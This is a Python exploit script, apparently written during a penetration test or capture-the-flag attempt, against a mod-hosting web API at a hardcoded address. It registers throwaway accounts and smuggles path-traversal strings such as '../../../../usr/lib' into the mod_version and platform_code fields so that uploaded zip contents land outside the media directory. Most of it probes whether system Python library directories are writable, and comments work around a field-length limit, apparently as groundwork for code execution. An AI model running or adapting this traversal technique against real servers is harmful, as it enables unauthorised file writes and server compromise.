#!/usr/bin/env python3
"""
_t42_probe_dirs.py - Probe which directories exist on the server
by trying to write test files and checking if mkdir succeeds.
Also test /usr/lib/python3.11/encodings/ path.
"""
import requests, sys, io, zipfile, secrets, time

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://144.79.188.39:42166"
if not BASE.startswith("http"):
    BASE = "http://" + BASE

def fresh_user():
    u = "u" + secrets.token_hex(4)
    pw = "Pass12345!"
    requests.post(f"{BASE}/api/auth/register/", json={"username": u, "password": pw}, timeout=15)
    r = requests.post(f"{BASE}/api/auth/login/", json={"username": u, "password": pw}, timeout=15)
    return r.json()["access"], u

def H(tok):
    return {"Authorization": f"Bearer {tok}"}

def try_write(tok, mod_version, platform_code, filename, data=b"test"):
    """Attempt to write filename to storage_dir = /data/media/builds/mv/pc/"""
    pid = None
    # Get or create platform
    r = requests.get(f"{BASE}/api/platforms/", headers=H(tok), timeout=15).json()
    items = r.get("results", r) if isinstance(r, dict) else r
    for it in (items or []):
        if isinstance(it, dict) and it.get("code") == platform_code:
            pid = it["id"]
    if not pid:
        rp = requests.post(f"{BASE}/api/platforms/", headers=H(tok),
            json={"code": platform_code, "name": "z"}, timeout=15)
        if rp.status_code not in (200, 201):
            return f"platform_err_{rp.status_code}", None
        pid = rp.json().get("id")
    
    rm = requests.post(f"{BASE}/api/mods/", headers=H(tok),
        json={"title":"z","mod_version":mod_version,"release_notes":"","is_enabled":True}, timeout=15)
    if rm.status_code not in (200, 201):
        return f"mod_err_{rm.status_code}", None
    mid = rm.json()["id"]
    
    rb = requests.post(f"{BASE}/api/mods/{mid}/builds/", headers=H(tok),
        json={"platform": pid}, timeout=15)
    if rb.status_code not in (200, 201):
        return f"build_err_{rb.status_code}", None
    bid = rb.json()["id"]
    
    bio = io.BytesIO()
    with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(filename, data)
    bio.seek(0)
    r = requests.post(f"{BASE}/api/mods/{mid}/builds/{bid}/upload/", headers=H(tok),
        files={"zip_file": ("p.zip", bio, "application/zip")}, timeout=30)
    return r.status_code, r.text[:100] if r.status_code != 200 else "OK"

print(f"[*] Probing {BASE}")

# Test 1: /usr/lib/python3.11/encodings/ existence
# mod_version='../../../../usr/lib' (19 chars), platform_code='python3.11/encodings' (20 chars)
tok, _ = fresh_user()
status, txt = try_write(tok, "../../../../usr/lib", "python3.11/encodings", "probe_encod.txt")
print(f"[1] /usr/lib/python3.11/encodings/ -> {status}: {txt}")

# Test 2: /usr/lib/python3.11/ existence  
tok2, _ = fresh_user()
status2, txt2 = try_write(tok2, "../../../../usr/lib", "python3.11", "probe_usrlib311.txt")
print(f"[2] /usr/lib/python3.11/ -> {status2}: {txt2}")

# Test 3: /usr/lib/python3/ existence
tok3, _ = fresh_user()
status3, txt3 = try_write(tok3, "../../../..", "usr/lib/python3", "probe_usrlib3.txt")
print(f"[3] /usr/lib/python3/ -> {status3}: {txt3}")

# Test 4: /usr/local/lib/python3.11/ top-level (already known writable)
tok4, _ = fresh_user()
status4, txt4 = try_write(tok4, "../../../usr/local", "lib/python3.11", "probe_toplevel.txt")
print(f"[4] /usr/local/lib/python3.11/ -> {status4}: {txt4}")

# Test 5: /usr/local/lib/python3.11/encodings/ (expected UNREACHABLE due to 24-char constraint)
# Workaround: use mod_version='../../../../usr' (15), platform_code='local/lib/python3.11/encod' (26) - too long
# OR: mod_version='../../../usr/local' (18), platform_code='lib/python3.11/encodi' (21) - too long 
# No valid split, skip

# Test 6: What about /usr/local/lib/ (without python3.11)?
tok6, _ = fresh_user()
status6, txt6 = try_write(tok6, "../../../usr/local", "lib", "probe_lib.txt")
print(f"[6] /usr/local/lib/ -> {status6}: {txt6}")

# Test 7: Check if python3.11 in /usr/lib has encodings by reading back
# We already know the server serves /media/ from MEDIA_ROOT
# The probe files won't be readable via nginx unless in html root
# But we can check 200 vs 500 to determine if dir exists

print("\n[*] Summary:")
print("  200 = directory exists and writable")
print("  500 = directory doesn't exist or not writable")
